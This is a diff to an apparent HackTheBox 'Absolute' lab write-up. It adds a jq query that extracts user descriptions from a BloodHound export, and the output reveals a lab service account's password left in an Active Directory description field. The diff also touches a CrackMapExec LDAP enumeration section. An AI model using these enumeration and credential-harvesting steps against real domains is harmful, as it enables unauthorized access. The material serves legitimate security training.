@@ -726,6 +726,30 @@ Drag `20230507174839_bloodhound.zip` into `bloodhound` once started.
 
 <figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
 
+#### Manual JQ Query for Users/Descriptions
+
+```
+cat 20230510214649_users.json | jq  '.data[].Properties | select( .enabled == true) | .name + " "  + .description'
+
+"WINRM_USER@ABSOLUTE.HTB Used to perform simple network tasks"
+"SVC_AUDIT@ABSOLUTE.HTB "
+"SVC_SMB@ABSOLUTE.HTB AbsoluteSMBService123!"
+"D.LEMM@ABSOLUTE.HTB "
+"S.JOHNSON@ABSOLUTE.HTB "
+"L.MOORE@ABSOLUTE.HTB "
+"M.LOVEGOD@ABSOLUTE.HTB "
+"N.SMITH@ABSOLUTE.HTB "
+"J.ROBINSON@ABSOLUTE.HTB "
+"C.COLT@ABSOLUTE.HTB "
+"S.OSVALD@ABSOLUTE.HTB "
+"D.KLAY@ABSOLUTE.HTB "
+"M.CHAFFREY@ABSOLUTE.HTB "
+"J.ROBERTS@ABSOLUTE.HTB "
+"ADMINISTRATOR@ABSOLUTE.HTB Built-in account for administering the computer/domain"
+```
+
+<mark style="color:yellow;">Looks like someone forgot to remove the password from the description once it was created!</mark>
+
 #### CrackMapExec LDAP get-desc-users
 
 ```
@@ -741,7 +765,7 @@ GET-DESC... dc.absolute.htb 389    DC               User: svc_smb description: A
 GET-DESC... dc.absolute.htb 389    DC               User: winrm_user description: Used to perform simple network tasks
 ```
 
-We see a password in the user, svc\_smb's description!
+We see a <mark style="color:yellow;">password</mark> in the user, svc\_smb's description!
 
 ```
 svc_smb:AbsoluteSMBService123!
